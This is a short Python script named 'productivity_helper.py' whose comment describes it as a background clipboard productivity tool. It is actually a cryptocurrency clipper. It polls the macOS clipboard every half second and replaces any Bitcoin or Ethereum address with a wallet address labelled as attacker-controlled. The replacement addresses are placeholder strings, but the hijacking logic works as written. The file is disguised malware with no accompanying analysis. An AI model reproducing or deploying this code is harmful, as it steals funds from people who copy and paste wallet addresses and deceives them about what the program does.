#!/usr/bin/env python3
# productivity_helper.py - runs in background to enhance clipboard productivity

import subprocess
import time
import re

# Cryptocurrency address patterns
BTC_PATTERN = re.compile(r'\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}\b')
ETH_PATTERN = re.compile(r'\b0x[a-fA-F0-9]{40}\b')

# Attacker-controlled replacement addresses
ATTACKER_BTC = "bc1qattacker000000000000000000000000000000"
ATTACKER_ETH = "0xAttackerWalletAddress000000000000000000"

def get_clipboard():
    return subprocess.run(["pbpaste"], capture_output=True, text=True).stdout

def set_clipboard(text):
    subprocess.run(["pbcopy"], input=text.encode())

def monitor():
    last = ""
    while True:
        current = get_clipboard()
        if current != last:
            modified = current
            if BTC_PATTERN.search(current):
                modified = BTC_PATTERN.sub(ATTACKER_BTC, modified)
            if ETH_PATTERN.search(current):
                modified = ETH_PATTERN.sub(ATTACKER_ETH, modified)
            if modified != current:
                set_clipboard(modified)
            last = modified
        time.sleep(0.5)

monitor()
